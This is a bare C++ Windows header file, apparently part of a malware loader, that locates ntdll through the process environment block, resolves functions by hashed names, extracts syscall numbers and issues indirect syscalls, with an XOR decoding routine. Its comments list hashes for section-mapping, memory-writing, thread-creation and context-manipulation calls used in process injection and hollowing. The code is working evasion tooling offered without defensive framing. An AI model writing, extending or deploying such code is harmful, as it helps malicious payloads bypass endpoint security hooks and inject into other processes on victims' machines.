#pragma once
#include <windows.h>
#include <winternl.h>
#include <cstring>

extern "C" NTSTATUS do_syscall(DWORD ssn,uintptr_t jmp,void* args,DWORD cnt);

struct SC {
    DWORD hash;uintptr_t addr;DWORD ssn;
    bool valid()const{return addr!=0;}
};
static SC _sc[4];static uintptr_t _jmp=0;

static DWORD _hash(const char* s){DWORD h=5381;int c;while((c=*s++))h=((h<<5)+h)+c;return h;}

typedef struct _LDR_DATA_TABLE_ENTRY_EX {
    LIST_ENTRY a;LIST_ENTRY b;LIST_ENTRY c;PVOID db;PVOID ep;ULONG si;
    UNICODE_STRING fd;UNICODE_STRING bd;ULONG fl;
} LDR_EX,*PLDR_EX;

static void* _getmod(DWORD hh){
    PPEB p=nullptr;
#ifdef _WIN64
    p=(PPEB)__readgsqword(0x60);
#else
    p=(PPEB)__readfsdword(0x30);
#endif
    if(!p||!p->Ldr)return nullptr;
    PLIST_ENTRY ml=&p->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur=ml->Flink;
    while(cur!=ml){
        PLDR_EX e=(PLDR_EX)((BYTE*)cur-(FIELD_OFFSET(LDR_EX,b)));
        if(e->bd.Buffer){
            char b[64];int w=0;
            for(int i=0;i<(int)(e->bd.Length/2)&&i<63;i++){
                char c=(char)e->bd.Buffer[i];b[w++]=(c>='A'&&c<='Z')?c+32:c;
            }
            b[w]=0;
            if(_hash(b)==hh)return e->db;
        }
        cur=cur->Flink;
    }
    return nullptr;
}

static FARPROC _getapi(void* m,DWORD fh){
    if(!m)return nullptr;
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)m;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)m+d->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* e=(IMAGE_EXPORT_DIRECTORY*)((BYTE*)m+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if(!e)return nullptr;
    DWORD* nm=(DWORD*)((BYTE*)m+e->AddressOfNames);
    DWORD* fn=(DWORD*)((BYTE*)m+e->AddressOfFunctions);
    WORD* ors=(WORD*)((BYTE*)m+e->AddressOfNameOrdinals);
    for(DWORD i=0;i<e->NumberOfNames;i++){
        const char* n2=(const char*)((BYTE*)m+nm[i]);
        if(_hash(n2)==fh)return(FARPROC)((BYTE*)m+fn[ors[i]]);
    }
    return nullptr;
}

static void _initsys(){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)nt;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)nt+d->e_lfanew);
    PIMAGE_SECTION_HEADER t=IMAGE_FIRST_SECTION(n);
    BYTE* ss=(BYTE*)nt+t->VirtualAddress;
    for(DWORD i=0;i<t->SizeOfRawData-2;i++){
        if(ss[i]==0x0F&&ss[i+1]==0x05){_jmp=(uintptr_t)(ss+i);break;}
    }
    DWORD tg[]={0x98ad6a23,0x904a0c6d,0x1f76d494,0x38612ca4};
    IMAGE_EXPORT_DIRECTORY* e=(IMAGE_EXPORT_DIRECTORY*)((BYTE*)nt+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* nm=(DWORD*)((BYTE*)nt+e->AddressOfNames);
    DWORD* fn=(DWORD*)((BYTE*)nt+e->AddressOfFunctions);
    WORD* ors=(WORD*)((BYTE*)nt+e->AddressOfNameOrdinals);
    int ix=0;
    for(DWORD i=0;i<e->NumberOfNames&&ix<4;i++){
        const char* n2=(const char*)((BYTE*)nt+nm[i]);DWORD h=_hash(n2);
        for(DWORD t:tg){if(h==t){BYTE* p=(BYTE*)nt+fn[ors[i]];
            if(p[0]==0x4C&&p[1]==0x8B&&p[2]==0xD1&&p[3]==0xB8){_sc[ix++]={h,(uintptr_t)p,*(DWORD*)(p+4)};}break;}}
    }
}

static NTSTATUS _call(DWORD h,uintptr_t a1=0,uintptr_t a2=0,uintptr_t a3=0,uintptr_t a4=0,uintptr_t a5=0,uintptr_t a6=0){
    for(int i=0;i<4;i++){if(_sc[i].hash==h){uintptr_t aa[]={a1,a2,a3,a4,a5,a6};return do_syscall(_sc[i].ssn,_jmp,aa,6);}}
    return 0xC0000002;
}

static void _xorf(unsigned char* d,int l,const unsigned char* k,int kl){for(int i=0;i<l;i++)d[i]^=k[i%kl];}

// Hash defs for syscalls
// NtCreateSection: 0x98ad6a23
// NtMapViewOfSection: 0x904a0c6d
// NtProtectVirtualMemory: 0x1f76d494
// NtUnmapViewOfSection: 0x38612ca4
// NtOpenProcess: 0xa8e35e0b
// NtAllocateVirtualMemory: 0x3ad74d22
// NtWriteVirtualMemory: 0x7e3c0d8c
// NtCreateThreadEx: 0xd177c66e
// NtQueueApcThread: 0x1c1fad57
// NtClose: 0x7a3b0e0e
// NtDelayExecution: 0x4d8c8bb0
// NtQueryInformationProcess: 0x90a05d6e
// NtSetInformationProcess: 0xc613c7de
// NtOpenSection: 0xaaddcd19
// NtGetContextThread: 0x07b58516
// NtSetContextThread: 0xed4b14a0
